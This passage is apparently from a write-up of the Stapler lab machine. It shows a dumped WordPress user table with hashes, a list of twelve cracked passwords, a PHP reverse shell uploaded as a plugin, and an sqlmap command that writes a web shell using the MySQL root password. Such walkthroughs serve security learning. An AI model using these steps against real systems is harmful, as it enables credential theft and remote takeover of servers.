class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="p">|</span> ID <span class="p">|</span> user_login <span class="p">|</span> user_pass                          <span class="p">|</span> user_nicename <span class="p">|</span> user_email            <span class="p">|</span> user_url         <span class="p">|</span> user_registered     <span class="p">|</span> user_activation_key <span class="p">|</span> user_status <span class="p">|</span> display_name    <span class="p">|</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="p">|</span>  <span class="m">1</span> <span class="p">|</span> John       <span class="p">|</span> <span class="nv">$P$B7889EMq</span>/erHIuZapMB8GEizebcIy9. <span class="p">|</span> john          <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#x69;&amp;#x6c;&amp;#x74;&amp;#111;&amp;#58;&amp;#106;&amp;#111;&amp;#x68;&amp;#110;&amp;#64;&amp;#x72;&amp;#101;&amp;#100;&amp;#46;&amp;#108;&amp;#111;&amp;#x63;&amp;#x61;&amp;#108;&amp;#x68;&amp;#x6f;&amp;#115;&amp;#x74;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#106;&amp;#x6f;&amp;#104;&amp;#110;&amp;#x40;&amp;#114;&amp;#x65;&amp;#x64;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#108;&amp;#x68;&amp;#111;&amp;#115;&amp;#x74;&lt;/a&gt;    | &lt;a href=&quot;http://localhost&quot;&gt;http://localhost&lt;/a&gt; | 2016-06-03 23:18:47 |                     |           0 | John Smith      |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">2</span> <span class="p">|</span> Elly       <span class="p">|</span> <span class="nv">$P$BlumbJRRBit7y50Y17</span>.UPJ/xEgv4my0 <span class="p">|</span> elly          <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#105;&amp;#x6c;&amp;#116;&amp;#111;&amp;#58;&amp;#x45;&amp;#108;&amp;#108;&amp;#121;&amp;#x40;&amp;#x72;&amp;#x65;&amp;#100;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#99;&amp;#97;&amp;#108;&amp;#104;&amp;#111;&amp;#115;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x45;&amp;#108;&amp;#x6c;&amp;#x79;&amp;#64;&amp;#x72;&amp;#101;&amp;#100;&amp;#x2e;&amp;#108;&amp;#111;&amp;#x63;&amp;#97;&amp;#108;&amp;#x68;&amp;#111;&amp;#115;&amp;#116;&lt;/a&gt;    |                  | 2016-06-05 16:11:33 |                     |           0 | Elly Jones      |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">3</span> <span class="p">|</span> Peter      <span class="p">|</span> <span class="nv">$P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0</span> <span class="p">|</span> peter         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#105;&amp;#x6c;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#112;&amp;#x65;&amp;#x74;&amp;#x65;&amp;#x72;&amp;#x40;&amp;#114;&amp;#x65;&amp;#x64;&amp;#x2e;&amp;#x6c;&amp;#111;&amp;#x63;&amp;#x61;&amp;#x6c;&amp;#x68;&amp;#111;&amp;#115;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#112;&amp;#x65;&amp;#116;&amp;#101;&amp;#114;&amp;#64;&amp;#114;&amp;#101;&amp;#x64;&amp;#46;&amp;#108;&amp;#111;&amp;#x63;&amp;#x61;&amp;#x6c;&amp;#104;&amp;#x6f;&amp;#115;&amp;#116;&lt;/a&gt;   |                  | 2016-06-05 16:13:16 |                     |           0 | Peter Parker    |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">4</span> <span class="p">|</span> barry      <span class="p">|</span> <span class="nv">$P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0</span> <span class="p">|</span> barry         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#x69;&amp;#108;&amp;#x74;&amp;#111;&amp;#x3a;&amp;#98;&amp;#97;&amp;#x72;&amp;#114;&amp;#121;&amp;#x40;&amp;#114;&amp;#101;&amp;#100;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#x61;&amp;#108;&amp;#104;&amp;#x6f;&amp;#x73;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#98;&amp;#x61;&amp;#x72;&amp;#x72;&amp;#x79;&amp;#x40;&amp;#114;&amp;#101;&amp;#x64;&amp;#46;&amp;#x6c;&amp;#x6f;&amp;#99;&amp;#x61;&amp;#108;&amp;#x68;&amp;#x6f;&amp;#115;&amp;#x74;&lt;/a&gt;   |                  | 2016-06-05 16:14:26 |                     |           0 | Barry Atkins    |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">5</span> <span class="p">|</span> heather    <span class="p">|</span> <span class="nv">$P$Bwd0VpK8hX4aN</span>.rZ14WDdhEIGeJgf10 <span class="p">|</span> heather       <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#x69;&amp;#108;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#104;&amp;#101;&amp;#x61;&amp;#116;&amp;#104;&amp;#x65;&amp;#x72;&amp;#x40;&amp;#114;&amp;#x65;&amp;#100;&amp;#x2e;&amp;#x6c;&amp;#111;&amp;#x63;&amp;#97;&amp;#x6c;&amp;#x68;&amp;#x6f;&amp;#x73;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#104;&amp;#x65;&amp;#x61;&amp;#116;&amp;#x68;&amp;#101;&amp;#114;&amp;#x40;&amp;#114;&amp;#x65;&amp;#100;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#x6c;&amp;#x68;&amp;#111;&amp;#115;&amp;#x74;&lt;/a&gt; |                  | 2016-06-05 16:18:04 |                     |           0 | Heather Neville |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">6</span> <span class="p">|</span> garry      <span class="p">|</span> <span class="nv">$P$BzjfKAHd6N4cHKiugLX</span>.4aLes8PxnZ1 <span class="p">|</span> garry         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#x69;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#103;&amp;#97;&amp;#114;&amp;#114;&amp;#x79;&amp;#64;&amp;#114;&amp;#x65;&amp;#100;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#108;&amp;#104;&amp;#111;&amp;#115;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#103;&amp;#x61;&amp;#x72;&amp;#114;&amp;#x79;&amp;#64;&amp;#114;&amp;#101;&amp;#x64;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x6c;&amp;#x68;&amp;#111;&amp;#x73;&amp;#116;&lt;/a&gt;   |                  | 2016-06-05 16:18:23 |                     |           0 | garry           |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">7</span> <span class="p">|</span> harry      <span class="p">|</span> <span class="nv">$P$BqV</span>.SQ6OtKhVV7k7h1wqESkMh41buR0 <span class="p">|</span> harry         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#105;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#x68;&amp;#x61;&amp;#x72;&amp;#x72;&amp;#x79;&amp;#x40;&amp;#x72;&amp;#101;&amp;#x64;&amp;#46;&amp;#x6c;&amp;#111;&amp;#99;&amp;#97;&amp;#x6c;&amp;#x68;&amp;#x6f;&amp;#115;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#104;&amp;#x61;&amp;#x72;&amp;#114;&amp;#x79;&amp;#64;&amp;#114;&amp;#101;&amp;#100;&amp;#46;&amp;#108;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#108;&amp;#x68;&amp;#x6f;&amp;#x73;&amp;#116;&lt;/a&gt;   |                  | 2016-06-05 16:18:41 |                     |           0 | harry           |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">8</span> <span class="p">|</span> scott      <span class="p">|</span> <span class="nv">$P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1</span> <span class="p">|</span> scott         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#105;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#x73;&amp;#99;&amp;#x6f;&amp;#x74;&amp;#116;&amp;#64;&amp;#x72;&amp;#x65;&amp;#100;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#108;&amp;#x68;&amp;#x6f;&amp;#115;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x73;&amp;#x63;&amp;#x6f;&amp;#116;&amp;#x74;&amp;#x40;&amp;#x72;&amp;#x65;&amp;#x64;&amp;#x2e;&amp;#x6c;&amp;#111;&amp;#x63;&amp;#x61;&amp;#x6c;&amp;#104;&amp;#111;&amp;#x73;&amp;#x74;&lt;/a&gt;   |                  | 2016-06-05 16:18:59 |                     |           0 | scott           |</span>
</span><span class='line'><span class="p">|</span>  <span class="m">9</span> <span class="p">|</span> kathy      <span class="p">|</span> <span class="nv">$P$BZlxAMnC6ON</span>.PYaurLGrhfBi6TjtcA0 <span class="p">|</span> kathy         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#105;&amp;#x6c;&amp;#x74;&amp;#111;&amp;#58;&amp;#107;&amp;#x61;&amp;#x74;&amp;#104;&amp;#121;&amp;#x40;&amp;#x72;&amp;#x65;&amp;#x64;&amp;#46;&amp;#108;&amp;#111;&amp;#x63;&amp;#97;&amp;#108;&amp;#104;&amp;#111;&amp;#x73;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x6b;&amp;#x61;&amp;#116;&amp;#x68;&amp;#x79;&amp;#x40;&amp;#114;&amp;#x65;&amp;#x64;&amp;#46;&amp;#x6c;&amp;#x6f;&amp;#99;&amp;#x61;&amp;#108;&amp;#104;&amp;#x6f;&amp;#x73;&amp;#x74;&lt;/a&gt;   |                  | 2016-06-05 16:19:14 |                     |           0 | kathy           |</span>
</span><span class='line'><span class="p">|</span> <span class="m">10</span> <span class="p">|</span> tim        <span class="p">|</span> <span class="nv">$P$BXDR7dLIJczwfuExJdpQqRsNf</span>.9ueN0 <span class="p">|</span> tim           <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#x74;&amp;#111;&amp;#x3a;&amp;#x74;&amp;#105;&amp;#x6d;&amp;#64;&amp;#114;&amp;#101;&amp;#100;&amp;#46;&amp;#x6c;&amp;#x6f;&amp;#99;&amp;#97;&amp;#108;&amp;#x68;&amp;#111;&amp;#x73;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#116;&amp;#105;&amp;#109;&amp;#64;&amp;#x72;&amp;#101;&amp;#x64;&amp;#46;&amp;#x6c;&amp;#111;&amp;#x63;&amp;#97;&amp;#108;&amp;#104;&amp;#111;&amp;#115;&amp;#x74;&lt;/a&gt;     |                  | 2016-06-05 16:19:29 |                     |           0 | tim             |</span>
</span><span class='line'><span class="p">|</span> <span class="m">11</span> <span class="p">|</span> ZOE        <span class="p">|</span> <span class="nv">$P$B</span>.gMMKRP11QOdT5m1s9mstAUEDjagu1 <span class="p">|</span> zoe           <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#x69;&amp;#108;&amp;#x74;&amp;#x6f;&amp;#x3a;&amp;#x7a;&amp;#x6f;&amp;#x65;&amp;#64;&amp;#x72;&amp;#x65;&amp;#100;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x6c;&amp;#104;&amp;#x6f;&amp;#115;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#122;&amp;#111;&amp;#101;&amp;#64;&amp;#114;&amp;#101;&amp;#x64;&amp;#x2e;&amp;#x6c;&amp;#111;&amp;#x63;&amp;#x61;&amp;#x6c;&amp;#x68;&amp;#111;&amp;#115;&amp;#116;&lt;/a&gt;     |                  | 2016-06-05 16:19:50 |                     |           0 | ZOE             |</span>
</span><span class='line'><span class="p">|</span> <span class="m">12</span> <span class="p">|</span> Dave       <span class="p">|</span> <span class="nv">$P$Bl7</span>/V9Lqvu37jJT.6t4KWmY.v907Hy. <span class="p">|</span> dave          <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#x6f;&amp;#58;&amp;#x64;&amp;#97;&amp;#x76;&amp;#x65;&amp;#x40;&amp;#x72;&amp;#x65;&amp;#x64;&amp;#46;&amp;#x6c;&amp;#x6f;&amp;#99;&amp;#97;&amp;#108;&amp;#x68;&amp;#x6f;&amp;#115;&amp;#x74;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#100;&amp;#97;&amp;#118;&amp;#x65;&amp;#64;&amp;#114;&amp;#101;&amp;#100;&amp;#46;&amp;#x6c;&amp;#111;&amp;#x63;&amp;#97;&amp;#108;&amp;#x68;&amp;#x6f;&amp;#x73;&amp;#116;&lt;/a&gt;    |                  | 2016-06-05 16:20:09 |                     |           0 | Dave            |</span>
</span><span class='line'><span class="p">|</span> <span class="m">13</span> <span class="p">|</span> Simon      <span class="p">|</span> <span class="nv">$P$BLxdiNNRP008kOQ</span>.jE44CjSK/7tEcz0 <span class="p">|</span> simon         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#111;&amp;#x3a;&amp;#115;&amp;#105;&amp;#x6d;&amp;#111;&amp;#110;&amp;#64;&amp;#114;&amp;#101;&amp;#100;&amp;#x2e;&amp;#x6c;&amp;#111;&amp;#x63;&amp;#x61;&amp;#108;&amp;#x68;&amp;#x6f;&amp;#x73;&amp;#x74;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x73;&amp;#105;&amp;#109;&amp;#x6f;&amp;#110;&amp;#x40;&amp;#114;&amp;#x65;&amp;#100;&amp;#46;&amp;#x6c;&amp;#111;&amp;#x63;&amp;#x61;&amp;#x6c;&amp;#x68;&amp;#111;&amp;#x73;&amp;#x74;&lt;/a&gt;   |                  | 2016-06-05 16:20:35 |                     |           0 | Simon           |</span>
</span><span class='line'><span class="p">|</span> <span class="m">14</span> <span class="p">|</span> Abby       <span class="p">|</span> <span class="nv">$P$ByZg5mTBpKiLZ5KxhhRe</span>/uqR.48ofs. <span class="p">|</span> abby          <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#x74;&amp;#111;&amp;#58;&amp;#97;&amp;#x62;&amp;#98;&amp;#x79;&amp;#64;&amp;#x72;&amp;#101;&amp;#x64;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#x6c;&amp;#x68;&amp;#x6f;&amp;#x73;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x61;&amp;#98;&amp;#x62;&amp;#x79;&amp;#x40;&amp;#114;&amp;#x65;&amp;#100;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#99;&amp;#x61;&amp;#x6c;&amp;#x68;&amp;#x6f;&amp;#x73;&amp;#116;&lt;/a&gt;    |                  | 2016-06-05 16:20:53 |                     |           0 | Abby            |</span>
</span><span class='line'><span class="p">|</span> <span class="m">15</span> <span class="p">|</span> Vicki      <span class="p">|</span> <span class="nv">$P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131</span> <span class="p">|</span> vicki         <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#x74;&amp;#x6f;&amp;#58;&amp;#x76;&amp;#105;&amp;#x63;&amp;#x6b;&amp;#x69;&amp;#x40;&amp;#114;&amp;#x65;&amp;#100;&amp;#x2e;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#108;&amp;#x68;&amp;#111;&amp;#115;&amp;#x74;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x76;&amp;#x69;&amp;#99;&amp;#107;&amp;#x69;&amp;#x40;&amp;#x72;&amp;#101;&amp;#x64;&amp;#x2e;&amp;#108;&amp;#x6f;&amp;#99;&amp;#97;&amp;#108;&amp;#x68;&amp;#111;&amp;#x73;&amp;#x74;&lt;/a&gt;   |                  | 2016-06-05 16:21:14 |                     |           0 | Vicki           |</span>
</span><span class='line'><span class="p">|</span> <span class="m">16</span> <span class="p">|</span> Pam        <span class="p">|</span> <span class="nv">$P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0</span> <span class="p">|</span> pam           <span class="p">|</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#105;&amp;#108;&amp;#x74;&amp;#x6f;&amp;#58;&amp;#x70;&amp;#97;&amp;#109;&amp;#x40;&amp;#x72;&amp;#101;&amp;#x64;&amp;#46;&amp;#108;&amp;#111;&amp;#x63;&amp;#97;&amp;#x6c;&amp;#104;&amp;#x6f;&amp;#x73;&amp;#x74;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x70;&amp;#x61;&amp;#x6d;&amp;#x40;&amp;#x72;&amp;#101;&amp;#100;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#108;&amp;#x68;&amp;#111;&amp;#115;&amp;#116;&lt;/a&gt;     |                  | 2016-06-05 16:42:23 |                     |           0 | Pam             |</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="m">16</span> rows in <span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;mysql&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Then I use <code>john the ripper</code> to crack those hahses and got the following cracked:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# john <span class="p">&amp;</span>ndash<span class="p">;</span>show 2.txt
</span><span class='line'>John:incorrect
</span><span class='line'>Elly:ylle
</span><span class='line'>barry:washere
</span><span class='line'>heather:passphrase
</span><span class='line'>garry:football
</span><span class='line'>harry:monkey
</span><span class='line'>scott:cookie
</span><span class='line'>kathy:coolgirl
</span><span class='line'>tim:thumb
</span><span class='line'>ZOE:partyqueen
</span><span class='line'>Dave:damachine
</span><span class='line'>Pam:0520&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;12 password hashes cracked, <span class="m">4</span> left
</span></code></pre></td></tr></table></div></figure></p>

<p>After tried all cracked user/password, I found <code>john</code> has higher priviledge and can be used to upload reverse web shell.</p>

<p>Login to WordPress with john&rsquo;s password, and then upload <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="PHP Reverse Shell by pentestmonkey">pentestmonkey&rsquo;s PHP reverse shell</a>(listen on local port 443) as a plugin.</p>

<p><img class="left" src="/downloads/stapler/4.png"></p>

<p>After installed the plugin, I went to <code>https://10.1.1.138:12380/blogblog/wp-content/uploads/</code> to check if the file has been uploaded.</p>

<p><img class="left" src="/downloads/stapler/5.png"></p>

<p>Greet! The web shell file <code>rsh.php</code> has already been uploaded successfully.</p>

<p>In terms to upload web shell, there is another method by using MySQL to write file.</p>

<p>From the previous stage, I got the full path is <font color="red"><code>/var/www/https/blogblog/</code></font> and also the writable directory is <font color="red"><code>/blogblog/wp-content/uploads/</code></font>. And the target MySQL root login password is <font color="red"><code>plbkac</code></font>.</p>

<p>So, now, I should be able to write web shell to target server via MySQL:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# sqlmap -d mysql://root:plbkac@10.1.1.138:3306/wordpress <span class="p">&amp;</span>ndash<span class="p">;</span>file-write<span class="o">=</span>rsh.php <span class="p">&amp;</span>ndash<span class="p">;</span>file-dest<span class="o">=</span>/var/www/https/blogblog/wp-content/uploads/rsh443.php
</span><span class='line'>         _
</span><span class='line'> &lt;strong&gt;&lt;em&gt; &lt;/em&gt;&lt;/strong&gt;<span class="p">|</span> <span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;em&gt; &lt;/em&gt;&lt;/strong&gt; &lt;/strong&gt;&lt;em&gt;  <span class="o">{</span>1.0.5.0#dev<span class="o">}</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt; -<span class="p">|</span> . <span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> .<span class="p">&amp;</span>lsquo<span class="p">;|</span> . <span class="p">|</span>
</span><span class='line'><span class="p">|</span>&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;  <span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;/strong&gt;,<span class="p">|</span>  &lt;em&gt;<span class="p">|</span>
</span><span class='line'>      <span class="p">|</span>&lt;/em&gt;<span class="p">|</span>           <span class="p">|</span>_<span class="p">|</span>   &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://sqlmap.org&quot;</span>&gt;http://sqlmap.org&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>!<span class="o">]</span> legal disclaimer: Usage of sqlmap <span class="k">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="p">&amp;</span>rsquo<span class="p">;</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for</span> any misuse or damage caused by this program&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>*<span class="o">]</span> starting at 23:12:04&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.138:3306 established
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing MySQL
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
